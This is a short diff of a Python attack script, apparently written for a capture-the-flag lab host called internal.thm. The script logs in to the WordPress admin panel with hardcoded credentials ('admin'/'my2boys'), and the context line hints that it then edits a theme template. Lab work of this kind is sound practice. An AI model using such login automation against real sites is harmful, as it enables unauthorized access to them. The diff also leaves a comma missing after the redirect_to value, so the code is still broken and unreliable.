@@ -19,8 +19,8 @@ get_footer();""",
 print("* Logging in")
 login = requests.post("http://internal.thm/blog/wp-login.php", {
         "log": "admin",
-        "pwd": "my2boys"
-        "wp-submit": "Log In"
+        "pwd": "my2boys",
+        "wp-submit": "Log In",
         "redirect_to": "http://internal.thm/blog/wp-admin/"
         "testcookie": 1
     })
